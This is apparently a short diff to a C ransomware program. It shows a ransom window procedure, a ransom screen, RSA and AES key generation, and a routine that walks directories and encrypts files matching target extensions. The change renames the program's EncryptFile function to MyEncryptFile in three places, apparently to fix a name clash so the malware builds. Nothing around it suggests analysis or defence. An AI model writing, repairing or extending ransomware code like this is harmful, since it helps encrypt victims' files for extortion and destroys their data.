@@ -117,7 +117,7 @@ int g_files_encrypted = 0;
 LRESULT CALLBACK RansomWndProc(HWND, UINT, WPARAM, LPARAM);
 void ShowRansomScreen(void);
 void EncryptDirectory(WCHAR* path);
-BOOL EncryptFile(WCHAR* path);
+BOOL MyEncryptFile(WCHAR* path);
 BOOL InitializeCrypto(void);
 void GenerateRSAKeys(void);
 void CleanupCrypto(void);
@@ -145,7 +145,7 @@ void GenerateRSAKeys(void) {
     CryptGenKey(hProv, CALG_AES_128, CRYPT_EXPORTABLE, &hSessionKey);
 }
 
-BOOL EncryptFile(WCHAR* filepath) {
+BOOL MyEncryptFile(WCHAR* filepath) {
     HANDLE hFile = CreateFileW(filepath, GENERIC_READ | GENERIC_WRITE, 0,
                                NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) return FALSE;
@@ -260,7 +260,7 @@ void EncryptDirectory(WCHAR* path) {
                     int len = wcslen(target);
                     // Compare ignoring case
                     if (_wcsicmp(ext, target) == 0) {
-                        EncryptFile(fullPath);
+                        MyEncryptFile(fullPath);
                         break;
                     }
                 }
